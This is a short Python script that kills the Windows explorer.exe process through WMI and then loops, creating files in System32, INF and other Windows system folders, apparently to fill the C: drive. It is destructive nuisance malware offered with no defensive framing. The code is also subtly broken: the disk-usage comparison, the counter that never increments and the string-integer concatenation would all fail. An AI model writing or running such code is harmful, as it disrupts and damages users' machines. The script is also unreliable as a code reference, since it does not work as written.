import ctypes
import shutil
import io
import platform
import sys
import os
import random
import wmi
from pathlib import Path

name = "explorer.exe"
f = wmi.WMI()
i = 0

for process in f.Win32_Process():
    if process.name == name:
        process.Terminate()

paths={"path1": "C:\\Windows\\Migration",
 "path2": "C:\\Windows\\",
 "path3": "C:\\Windows\\System32", 
 "path4": "C:\\Windows\\System", 
 "path5": "C:\\Windows\\PLA", 
 "path6": "C:\\Windows\\INF", 
 "path7": "C:\\Windows\\Migration"}

while shutil.disk_usage("C:\\") > 100:
    i + 1
    path = Path(random.choice(list(paths.values())) + "\\" + i + ".txt")
    path.touch(mode=0o666, exist_ok=True)
    #file = open(random.randrange(1,100000) + ".txt", "w")
    #size = 10485760
    #file.truncate("\0" * size)
    #file.close()
